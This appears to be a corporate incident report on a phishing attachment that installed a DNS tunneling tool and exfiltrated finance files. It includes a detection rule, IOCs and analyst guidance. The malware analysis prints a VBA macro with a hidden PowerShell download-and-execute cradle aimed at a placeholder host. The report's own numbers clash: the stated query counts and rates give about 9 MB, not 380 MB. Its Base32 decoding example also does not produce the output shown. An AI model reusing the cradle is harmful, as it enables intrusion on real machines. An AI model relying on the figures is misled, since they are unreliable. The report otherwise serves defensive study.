# Incident Report: DNS Tunneling and Data Exfiltration

**Incident ID:** INC-2026-0067
**Date Opened:** 2026-02-03 14:47 UTC
**Date Closed:** 2026-02-07 17:00 UTC
**Incident Handler:** SOC Analyst (Tier 2), IR Lead
**Severity:** P1 -- Critical
**Classification:** Data Exfiltration
**Status:** Closed

---

## Executive Summary

On February 3, 2026, at 14:47 UTC, the SOC identified anomalous DNS query patterns from the workstation `FIN-WS-118` (10.10.20.118) in the Finance department. Investigation revealed that a threat actor had compromised the workstation via a weaponized Excel attachment delivered by email on January 28. The attacker deployed a custom DNS tunneling tool to exfiltrate data by encoding it into DNS queries to the attacker-controlled domain `data-analytics-cdn.example`. Over the approximately six-day dwell time, an estimated 380 MB of data was exfiltrated through DNS, including financial reports and internal budget documents. The incident was classified as P1 due to the confirmed data exfiltration of confidential business information. Full containment was achieved on February 3, and recovery was completed on February 5.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Observed Activity |
|--------|-----------|-----|-------------------|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | Weaponized Excel file with VBA macro delivered via email |
| Execution | User Execution: Malicious File | T1204.002 | User opened Excel attachment and enabled macros |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | Scheduled task `WindowsUpdateCheck` created to run tunneling tool every 15 minutes |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 | Tunneling binary named `svchost.exe` placed in `C:\ProgramData\Microsoft\` |
| Defense Evasion | Obfuscated Files or Information | T1027 | DNS queries used Base32 encoding to obfuscate exfiltrated data |
| Collection | Data from Local System | T1005 | Files copied from `C:\Users\j.martinez\Documents\Finance\` |
| Collection | Archive Collected Data: Archive via Utility | T1560.001 | Data compressed with built-in `tar` before exfiltration |
| Command and Control | Application Layer Protocol: DNS | T1071.004 | C2 communication over DNS TXT and A record queries |
| Exfiltration | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | T1048.003 | Data exfiltrated via DNS queries to attacker-controlled authoritative name server |
| Exfiltration | Data Transfer Size Limits | T1030 | Data split into small chunks encoded in DNS subdomain labels (max 63 bytes per label) |

---

## Timeline of Events

| Timestamp (UTC) | Source | Event |
|-----------------|--------|-------|
| 2026-01-28 09:14 | Email gateway | Phishing email delivered to j.martinez@corp.example.com from `invoice-notifications@supplier-portal.example` with attachment `Q4_Invoice_Final.xlsm` |
| 2026-01-28 09:22 | EDR | j.martinez opened `Q4_Invoice_Final.xlsm` and enabled macros. VBA macro executed PowerShell download cradle |
| 2026-01-28 09:22 | EDR (retrospective) | PowerShell downloaded payload from `hxxps://cdn-static-assets.example/update.dat` and wrote `C:\ProgramData\Microsoft\svchost.exe` |
| 2026-01-28 09:23 | EDR (retrospective) | Scheduled task `WindowsUpdateCheck` created to execute `C:\ProgramData\Microsoft\svchost.exe` every 15 minutes |
| 2026-01-28 09:30 | DNS logs | First DNS queries to `data-analytics-cdn.example` observed -- C2 beacon check-in |
| 2026-01-28 09:30 -- 2026-02-03 14:47 | DNS logs | Sustained DNS tunneling activity: ~62,000 DNS queries to subdomains of `data-analytics-cdn.example` over 6 days |
| 2026-02-03 14:47 | SIEM (Splunk) | Alert `DNS-HIGH-ENTROPY-SUBDOMAIN` triggered: anomalous volume of high-entropy DNS queries to a single domain from one host |
| 2026-02-03 14:55 | SOC Analyst | Alert triaged. DNS query sample reviewed -- Base32-encoded subdomain strings confirmed. Incident opened, severity set to P2 |
| 2026-02-03 15:10 | SOC Analyst | Domain `data-analytics-cdn.example` investigated: registered 2026-01-25 (4 days before the attack); WHOIS privacy-protected; hosted on 198.51.100.200. No legitimate business use identified. Severity escalated to P1 |
| 2026-02-03 15:15 | SOC Analyst | FIN-WS-118 isolated via CrowdStrike Falcon network containment |
| 2026-02-03 15:17 | SOC Analyst | `data-analytics-cdn.example` and 198.51.100.200 blocked at DNS resolver and perimeter firewall |
| 2026-02-03 15:20 | IR Lead | IR bridge call activated; forensic investigation initiated |
| 2026-02-03 15:30 | IR Lead | Memory dump captured from FIN-WS-118 using WinPmem |
| 2026-02-03 15:45 | IR Lead | Disk image captured using FTK Imager (forensic copy of C: drive) |
| 2026-02-03 16:00 | IR Lead | Scheduled task `WindowsUpdateCheck` identified; malicious binary `svchost.exe` located at `C:\ProgramData\Microsoft\svchost.exe` |
| 2026-02-03 16:30 | IR Lead | VBA macro in original Excel file extracted and analyzed -- PowerShell download cradle confirmed |
| 2026-02-03 17:00 | IR Lead | DNS query log analysis: estimated 380 MB of data exfiltrated based on query volume and encoding overhead |
| 2026-02-03 18:00 | IR Lead | User j.martinez interviewed: confirmed opening the Excel file, believed it was a legitimate vendor invoice |
| 2026-02-03 19:00 | IR Lead | Scope assessment: no evidence of lateral movement from FIN-WS-118; compromised credentials not detected; other hosts not querying the malicious domain |
| 2026-02-04 10:00 | IR Lead | Malware reverse engineering: custom DNS tunneling client with Base32 encoding, file harvesting capability targeting Documents folder, TXT record C2 protocol |
| 2026-02-04 14:00 | Legal Counsel | Notified of potential confidential data exposure; breach assessment initiated |
| 2026-02-05 09:00 | IT Operations | FIN-WS-118 reimaged from golden image; user data restored from pre-compromise backup (2026-01-27) |
| 2026-02-05 11:00 | IT Operations | j.martinez credentials reset; MFA re-enrolled |
| 2026-02-05 14:00 | SOC Analyst | SIEM rule tuned to detect DNS tunneling patterns with lower threshold |
| 2026-02-06 10:00 | IR Lead | Post-incident review meeting conducted |
| 2026-02-07 17:00 | IR Lead | Incident closed after 72-hour monitoring period showed no recurrence |

---

## Technical Analysis

### Detection

The incident was detected by the following SIEM correlation rule:

```
# Splunk alert: DNS-HIGH-ENTROPY-SUBDOMAIN
index=dns sourcetype=dns:query
  query_type IN ("A", "TXT", "CNAME")
  earliest=-1h
| eval subdomain=mvindex(split(query,"."),0)
| eval entropy=shannon_entropy(subdomain)
| eval label_length=len(subdomain)
| where entropy > 3.5 AND label_length > 20
| stats count as query_count dc(query) as unique_queries by src_ip, query_domain
| where query_count > 100 AND unique_queries > 50
```

This rule identifies hosts generating a high volume of DNS queries where the subdomain component has high Shannon entropy (characteristic of encoded/encrypted data) and unusual length. The alert triggered when FIN-WS-118 exceeded the threshold of 100 high-entropy queries to a single domain in one hour.

**Detection gap:** The DNS tunneling activity began on January 28 but was not detected until February 3 -- a **6-day dwell time**. The alert threshold was set to trigger on burst activity, and the attacker's tool throttled queries to approximately 430 queries per hour (one every ~8.3 seconds), which stayed below the per-hour threshold most of the time. The alert finally triggered when the tool increased its query rate during a larger file transfer.

### Network Forensics: DNS Tunneling Analysis

**DNS query pattern observed:**

```
# Sample DNS queries from FIN-WS-118 (from DNS server query log)
2026-02-03 14:30:01  10.10.20.118  A     MFRGGZDFMY4TQMJSGM2DKNRXHA3TSNRZGU.data-analytics-cdn.example
2026-02-03 14:30:09  10.10.20.118  A     4DOMBZG4ZDKOBYHAZDCNZZG44DQMZWHAZD.data-analytics-cdn.example
2026-02-03 14:30:17  10.10.20.118  TXT   BEACON.data-analytics-cdn.example
2026-02-03 14:30:25  10.10.20.118  A     CNBSG43DFOBYHA2DFNZRGK3TUNFWC4ZAOR.data-analytics-cdn.example
2026-02-03 14:30:33  10.10.20.118  A     UG4ZDQOJXGI3DJNZZWK4TFHYYDAMBQGAYD.data-analytics-cdn.example
```

**Analysis of the tunneling protocol:**

| Component | Detail |
|-----------|--------|
| **Encoding** | Base32 (RFC 4648) in subdomain labels, allowing binary data in DNS-safe characters |
| **Query types used** | A records for data exfiltration (encoded data in subdomain); TXT records for C2 command reception |
| **Beacon interval** | TXT query to `BEACON.data-analytics-cdn.example` every ~5 minutes for command polling |
| **Data channel** | A queries with Base32-encoded file chunks in subdomain, ~63 bytes of encoded data per label, up to 3 labels per query |
| **Throughput** | ~150 bytes of raw data per query; ~430 queries/hour = ~63 KB/hour = ~1.5 MB/day sustained |
| **Total estimated exfiltration** | ~62,000 queries over 6 days = ~380 MB of encoded data (~280 MB raw data after encoding overhead) |

**Decoding example:**

```bash
# Decoding a captured DNS query subdomain
echo "MFRGGZDFMY4TQMJSGM2DKNRXHA3TSNRZGU" | base32 -d
# Output: "budget_report_2026_Q"  (fragment of a filename)
```

**DNS response analysis:**

```bash
# The attacker's authoritative DNS server responded to A queries with
# acknowledgment codes in the IP address:
# 198.51.100.1 = chunk received successfully
# 198.51.100.2 = retransmit last chunk
# 198.51.100.99 = end of file acknowledged

# TXT record responses contained Base32-encoded commands:
# Example decoded TXT response: "HARVEST:C:\Users\j.martinez\Documents\Finance\*.xlsx"
```

### Malware Analysis

**Dropper: `Q4_Invoice_Final.xlsm`**

| Property | Value |
|----------|-------|
| SHA256 | `e4a1c3b5d7f9...truncated...8a2e6f` |
| File type | Microsoft Excel Macro-Enabled Workbook |
| VBA payload | AutoOpen macro executing PowerShell download cradle |

**VBA macro (deobfuscated):**

```vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command " & _
          """IEX (New-Object Net.WebClient).DownloadString(" & _
          "'hxxps://cdn-static-assets.example/update.dat')"""
    Shell cmd, vbHide
End Sub
```

**Tunneling tool: `svchost.exe` (masquerading)**

| Property | Value |
|----------|-------|
| SHA256 | `7f3b2a9d1e5c...truncated...4c8d0f` |
| File size | 487 KB |
| File location | `C:\ProgramData\Microsoft\svchost.exe` |
| Compiler | Go 1.21 (statically compiled, UPX packed) |
| Functionality | DNS tunneling client with file harvesting, Base32 encoding, configurable beacon interval |
| C2 domain | `data-analytics-cdn.example` |
| Persistence | Scheduled task `WindowsUpdateCheck` running every 15 minutes |
| Collection behavior | Recursively harvests `.xlsx`, `.docx`, `.pdf`, `.csv` files from user Documents folder |

**Persistence mechanism:**

```xml
<!-- Scheduled task XML (reconstructed) -->
<Task>
  <RegistrationInfo>
    <Date>2026-01-28T09:23:00</Date>
    <Author>SYSTEM</Author>
    <Description>Windows Update Check Service</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT15M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2026-01-28T09:30:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>C:\ProgramData\Microsoft\svchost.exe</Command>
    </Exec>
  </Actions>
</Task>
```

### Data Impact Assessment

Files confirmed to have been staged for exfiltration (based on malware file access logs recovered from the binary's internal log buffer):

| File | Size | Classification |
|------|------|---------------|
| FY2026_Budget_Draft_v3.xlsx | 4.2 MB | Confidential |
| Q4_2025_Financial_Summary.xlsx | 2.8 MB | Confidential |
| Vendor_Payment_Schedule_Jan2026.csv | 1.1 MB | Internal |
| Board_Presentation_Financials.pptx | 18.4 MB | Confidential |
| Employee_Compensation_Review.xlsx | 3.6 MB | Restricted |
| Capital_Expenditure_Forecast.pdf | 890 KB | Confidential |
| Monthly_Revenue_Report_Dec2025.xlsx | 1.9 MB | Internal |

Additional files may have been exfiltrated that were not recorded in the tool's internal log. The total data volume estimated from DNS query analysis exceeds the size of the known staged files, suggesting additional files were transferred.

---

## Impact Assessment

| Category | Assessment |
|----------|-----------|
| Systems affected | 1 endpoint (FIN-WS-118) |
| Accounts compromised | 1 user account (j.martinez) -- no evidence of credential theft but treated as compromised |
| Data exposure | **Confirmed exfiltration** of confidential financial documents including budgets, compensation data, and board materials. Estimated 280 MB of raw data exfiltrated. |
| Downtime | 2 business days for the affected user during reimage and recovery |
| Financial impact | Direct IR costs (~40 analyst-hours); potential competitive/business impact of disclosed financial data unknown |
| Regulatory impact | Compensation data may constitute employee PII under applicable state law. Legal counsel evaluating notification requirements. |
| Reputational impact | No external disclosure required at this time per legal assessment |

---

## Containment, Eradication & Recovery

### Containment

| Action | Timestamp | Performed By |
|--------|-----------|-------------|
| Network-isolated FIN-WS-118 via CrowdStrike Falcon | 2026-02-03 15:15 | SOC Analyst |
| Blocked `data-analytics-cdn.example` at internal DNS resolver (sinkholed) | 2026-02-03 15:17 | SOC Analyst |
| Blocked 198.51.100.200 at perimeter firewall (inbound and outbound) | 2026-02-03 15:17 | SOC Analyst |
| Blocked `cdn-static-assets.example` at proxy and DNS (payload delivery domain) | 2026-02-03 15:20 | SOC Analyst |
| Searched all other endpoints for the malware hash -- no additional infections found | 2026-02-03 19:00 | IR Lead |
| Searched DNS logs for queries to `data-analytics-cdn.example` from other hosts -- none found | 2026-02-03 19:00 | IR Lead |

### Eradication

| Action | Timestamp | Performed By |
|--------|-----------|-------------|
| Captured memory dump and disk image for forensics | 2026-02-03 15:30-15:45 | IR Lead |
| Removed scheduled task `WindowsUpdateCheck` | 2026-02-04 09:00 | IR Lead |
| Deleted `C:\ProgramData\Microsoft\svchost.exe` | 2026-02-04 09:00 | IR Lead |
| Purged phishing email from all mailboxes using Compliance Search | 2026-02-04 10:00 | SOC Analyst |
| Blocked sender domain at email gateway | 2026-02-04 10:00 | SOC Analyst |

### Recovery

| Action | Timestamp | Performed By |
|--------|-----------|-------------|
| FIN-WS-118 reimaged from golden image with current patches | 2026-02-05 09:00 | IT Operations |
| EDR agent installed and verified reporting to console | 2026-02-05 09:30 | IT Operations |
| User data restored from backup dated 2026-01-27 (pre-compromise) | 2026-02-05 10:00 | IT Operations |
| Restored data scanned with updated AV signatures -- clean | 2026-02-05 10:30 | IT Operations |
| j.martinez password reset, MFA re-enrolled | 2026-02-05 11:00 | IT Operations |
| FIN-WS-118 returned to production with enhanced monitoring | 2026-02-05 14:00 | SOC Analyst |
| 72-hour enhanced monitoring period completed -- no anomalies | 2026-02-07 14:00 | SOC Analyst |

---

## Root Cause Analysis

- **Immediate cause:** User opened a malicious Excel attachment and enabled macros, allowing execution of a PowerShell download cradle that installed a DNS tunneling tool.
- **Contributing factors:**
  - Microsoft Office macro execution was permitted by Group Policy for the Finance department (business justification for legacy financial models).
  - The phishing email bypassed the email gateway because the sender domain had a valid SPF record and the attachment was not flagged by the gateway's sandbox (it required user interaction to trigger).
  - DNS traffic to external resolvers was not inspected or filtered for anomalous patterns. No DNS monitoring was in place beyond basic logging.
  - The 6-day dwell time resulted from the alert threshold being too high for low-and-slow exfiltration.
- **Root cause:** Insufficient defense-in-depth for the DNS channel. DNS was treated as a trusted protocol with no content inspection, anomaly detection, or restrictions on query patterns. Combined with permissive macro policies, this allowed the attacker to establish a covert exfiltration channel that operated undetected for nearly a week.

---

## Recommendations

| Priority | Recommendation | Owner | Target Date | Status |
|----------|---------------|-------|-------------|--------|
| Critical | Deploy DNS security solution with query inspection and anomaly detection (e.g., Cisco Umbrella, Infoblox DNS Firewall, or Palo Alto DNS Security) | Network Security | 2026-03-15 | In Progress |
| Critical | Restrict Office macro execution: block macros in files from the internet (Mark of the Web), allow only signed macros for departments that require them | IT Security | 2026-03-01 | In Progress |
| High | Implement DNS query length and entropy monitoring in SIEM with lower thresholds (alert at 50 high-entropy queries/hour instead of 100) | SOC | 2026-02-15 | Complete |
| High | Block DNS over HTTPS (DoH) and DNS over TLS (DoT) at the perimeter to maintain visibility into DNS traffic | Network Security | 2026-03-01 | In Progress |
| High | Deploy email gateway advanced threat protection with attachment sandboxing that forces macro execution | IT Security | 2026-03-15 | Not Started |
| Medium | Restrict outbound DNS to corporate resolvers only (block direct DNS to external resolvers at the firewall) | Network Security | 2026-03-15 | In Progress |
| Medium | Implement DLP monitoring on endpoints for Finance department to alert on bulk file access | IT Security | 2026-04-01 | Not Started |
| Low | Conduct targeted security awareness training for Finance department on spearphishing | Security Awareness | 2026-03-01 | Complete |

---

## Lessons Learned

### What Went Well

- Once detected, containment was executed rapidly (28 minutes from alert to full isolation)
- Forensic evidence collection was thorough and followed chain of custody procedures
- Cross-team coordination between SOC, IR, IT Operations, and Legal was effective
- Scope assessment was comprehensive -- confirmed the infection did not spread laterally

### What Could Be Improved

- **6-day dwell time is unacceptable.** DNS anomaly detection thresholds were too high for low-and-slow exfiltration. The attacker intentionally throttled query rates to stay below the alerting threshold.
- **DNS was a blind spot.** No DNS content inspection or filtering was in place. DNS should be treated as a potential exfiltration and C2 channel, not as a trusted protocol.
- **Macro policy was too permissive.** The Finance department had a blanket exception for macros that should have been scoped more narrowly (e.g., only signed macros from specific trusted publishers).
- **Initial EDR alert was missed.** The EDR generated a medium-confidence alert for the PowerShell download cradle on January 28 but it was triaged as a false positive because the parent process was Excel (a common FP pattern for the Finance team). The triage process should include additional validation steps for download cradles even from common applications.

---

## Appendix A: IOCs

### Network Indicators

| Type | Value | Context |
|------|-------|---------|
| Domain | `data-analytics-cdn.example` | C2 and exfiltration domain (DNS tunneling) |
| Domain | `cdn-static-assets.example` | Payload delivery domain |
| Domain | `supplier-portal.example` | Phishing sender domain |
| IP | 198.51.100.200 | Authoritative DNS server for C2 domain |
| IP | 203.0.113.88 | Hosting IP for payload delivery domain |
| URL | `hxxps://cdn-static-assets.example/update.dat` | Payload download URL |
| Email | `invoice-notifications@supplier-portal.example` | Phishing sender address |

### File Indicators

| Type | Value | Context |
|------|-------|---------|
| SHA256 | `e4a1c3b5d7f9...8a2e6f` | Q4_Invoice_Final.xlsm (phishing attachment) |
| SHA256 | `7f3b2a9d1e5c...4c8d0f` | svchost.exe (DNS tunneling tool) |
| File path | `C:\ProgramData\Microsoft\svchost.exe` | Tunneling tool location |
| Scheduled task | `WindowsUpdateCheck` | Persistence mechanism |

### Host Indicators

| Type | Value | Context |
|------|-------|---------|
| Scheduled task name | `\WindowsUpdateCheck` | Persistence -- runs malware every 15 min |
| File path | `C:\ProgramData\Microsoft\svchost.exe` | Masquerading as legitimate system binary |
| DNS query pattern | `[Base32-encoded-data].data-analytics-cdn.example` | High-entropy subdomains > 20 chars |

## Appendix B: Evidence Log

| Evidence ID | Description | Source | Collected By | Timestamp | SHA256 | Location |
|-------------|-------------|--------|-------------|-----------|--------|----------|
| EV-067-001 | Memory dump (WinPmem) | FIN-WS-118 | IR Lead | 2026-02-03 15:30 | 3a8f2b...c7d1 | /evidence/INC-2026-0067/ |
| EV-067-002 | Disk image (FTK Imager E01) | FIN-WS-118 | IR Lead | 2026-02-03 15:45 | 9e4c1d...a3f8 | /evidence/INC-2026-0067/ |
| EV-067-003 | Malware sample (svchost.exe) | FIN-WS-118 | IR Lead | 2026-02-03 16:00 | 7f3b2a...4c8d | /evidence/INC-2026-0067/ |
| EV-067-004 | Phishing email (.eml) | Email gateway | SOC Analyst | 2026-02-03 16:30 | b2e7f1...d9a4 | /evidence/INC-2026-0067/ |
| EV-067-005 | Excel attachment (xlsm) | Email gateway | SOC Analyst | 2026-02-03 16:30 | e4a1c3...8a2e | /evidence/INC-2026-0067/ |
| EV-067-006 | DNS query log (Jan 28 - Feb 3) | DNS server | IR Lead | 2026-02-03 17:00 | 5d2a8e...b1c4 | /evidence/INC-2026-0067/ |
| EV-067-007 | Scheduled task XML export | FIN-WS-118 | IR Lead | 2026-02-04 09:00 | 1c9f4a...e2d7 | /evidence/INC-2026-0067/ |

## Appendix C: DNS Tunneling Detection Guidance

For SOC analysts investigating potential DNS tunneling, look for these indicators:

| Indicator | Normal DNS | DNS Tunneling |
|-----------|-----------|---------------|
| Subdomain length | 5-20 characters typical | 30-63 characters (max label length) |
| Shannon entropy of subdomain | 2.0-3.0 | 3.5-4.5+ |
| Query volume to single domain | <100/day typical | Hundreds to thousands per hour |
| Unique subdomains per domain | Low (www, mail, etc.) | Very high (every query is unique) |
| Query type distribution | Mostly A, AAAA | Heavy use of TXT, NULL, CNAME |
| Time pattern | Follows user activity | Consistent 24/7 or regular intervals |
| Response size (TXT records) | <200 bytes typical | Near maximum (~4096 bytes) |

**Useful tools for DNS tunneling analysis:**

```bash
# Zeek -- extract DNS queries and calculate statistics
zeek -r capture.pcap local "Log::default_rotation_interval=0sec"
cat dns.log | zeek-cut query | awk -F. '{print $NF"."$(NF-1)}' | sort | uniq -c | sort -rn | head -20

# Wireshark display filter for long DNS queries
dns.qry.name.len > 50

# Calculate Shannon entropy of DNS queries (Python)
import math
from collections import Counter
def entropy(s):
    p = [c/len(s) for c in Counter(s).values()]
    return -sum(pi * math.log2(pi) for pi in p)
```
